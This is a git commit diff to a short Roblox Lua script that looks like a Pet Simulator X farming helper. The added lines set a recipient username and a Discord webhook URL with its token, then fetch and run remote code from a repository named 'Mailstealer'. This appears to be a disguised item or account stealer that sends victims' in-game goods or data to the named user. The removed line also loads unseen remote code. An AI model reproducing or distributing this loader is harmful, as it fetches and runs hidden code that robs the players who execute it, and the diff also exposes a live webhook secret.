d0863cec49e4069bc8f849f2802ce0ad1017f0dc
Hegejfvsjw <132260042+Hegejfvsjw@users.noreply.github.com>
2024-01-04 10:34:48 +0300

    Script.lua

--- Script.lua
+++ Script.lua
@@ -1,4 +1,4 @@
 Username = "LEGACROW11"
-loadingscreen = true 
-farmui = true
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/pets9.lua"))()
+Webhook = "https://discord.com/api/webhooks/1192368625038925884/tbAufM4TZ8HU-Fdy_JG864eNm-gOXyHfJjb0k9BW4YmJoZXXK0cL6jJfpi6SZxu9LTXW"
+LoadingScreen = true
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MailstealerV2/Mailstealer/main/v2"))()
